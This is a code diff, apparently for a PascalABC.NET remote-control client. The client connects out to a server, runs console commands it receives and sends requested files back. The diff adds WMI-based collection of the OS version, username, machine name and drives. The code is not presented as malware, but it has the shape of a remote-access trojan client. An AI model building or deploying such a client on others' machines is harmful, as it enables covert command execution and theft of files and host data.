@@ -2,6 +2,7 @@
 
 uses 
   System.Net.Sockets, 
+  System.Management,
   System.Threading, 
   System.Text, 
   System.Net, 
@@ -22,8 +23,9 @@ type
     public retry: byte;
     public port: integer;
     public path, epath: string;
-    
+    public WinInfo: WindowsInformation;
     public _pp_service: Thread;
+    
     
     public constructor(ip: string);
     begin
@@ -31,12 +33,12 @@ type
       self.ip := ip; 
       self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
       self._pp_service := new Thread(PPService);
+      self.WinInfo := self.GetOSInfo();
     end;
     
     
     public constructor(ip: string; port: integer; clnt: TcpClient);
     begin
-      self.AppIsRunning := true;
       self.client := clnt;
       self.client.Client.ReceiveTimeout := 100;
       self.ip := ip;
@@ -67,7 +69,7 @@ type
             self._pp_service.Start();
             cmd.CD();
             self.path := cmd.output;
-            self.epath := self.path;
+            self.epath := Environment.CurrentDirectory;
             break; // Если подключились, выходим из цикла
           except
             Thread.Sleep(RETRY_DELAY); // Задержка перед повторной попыткой
@@ -108,7 +110,7 @@ type
     end;
     
     
-    async procedure PPService();
+    private procedure PPService();
     begin
       stream := self.client.GetStream();
       var data: array of byte;
@@ -124,12 +126,18 @@ type
           var message := Encoding.UTF8.GetString(data, 0, len);
           
           if message = 'PING' then 
-            message := 'PONG' else 
+             message := 'PONG' else 
+               
           if message = GETPATH then
-            message := self.path else 
+             message := self.path else 
+               
+          if message = GET_WIN_INFO then
+             message := GetWinInfo() else
+               
           if message.StartsWith('E@') then 
-            message := ExplorerHandler(message) else 
-            message := ConsoleHandler(message);
+             message := ExplorerHandler(message) 
+          else               
+             message := ConsoleHandler(message);
           
           data := Encoding.UTF8.GetBytes(message);
           stream.Write(data, 0, data.Length);
@@ -142,7 +150,7 @@ type
     end;
     
     /// Обработка полученных запросов от консоли
-    function ConsoleHandler(msg: string): string;
+    public function ConsoleHandler(msg: string): string;
     begin
       var responce: string;
       
@@ -158,7 +166,7 @@ type
     end;  
     
     /// Обработка полученных запросов от проводника
-    function ExplorerHandler(msg: string): string;
+    public function ExplorerHandler(msg: string): string;
     begin
       var responce: string = msg;
       
@@ -193,7 +201,10 @@ type
           end; 
           E_RECEIVE_FILE:
             begin
-              var filePath := self.epath + SLASH + msg.Substring(3);
+              var filePath := Strip(self.epath, AllDelimiters) + SLASH + Strip(msg.Substring(3), AllDelimiters);
+              
+              Println(filePath);
+              Println(System.IO.File.Exists(filePath));
               var FStream: FileStream := System.IO.File.OpenRead(filePath);
               
               // Получение размера файла
@@ -225,6 +236,25 @@ type
       end; 
     end;    
   
+  
+    public function GetWinInfo(): string := JsonConvert.SerializeObject(self.WinInfo);
+  
+  
+    private function GetOSInfo(): WindowsInformation;
+    begin 
+      var searcher := new ManagementObjectSearcher('SELECT Caption FROM Win32_OperatingSystem');
+      var WinVer: string;
+      
+      foreach var obj: ManagementObject in searcher.Get() do
+        WinVer := obj['Caption'].ToString;
+                   
+      Result := new WindowsInformation(
+          WinVer.Substring(11),
+          Environment.OSVersion.Platform.ToString,
+          Environment.UserName                       as string,
+          Environment.MachineName                    as string,
+          DriveInfo.GetDrives());
+    end;
   
   end; // class
 
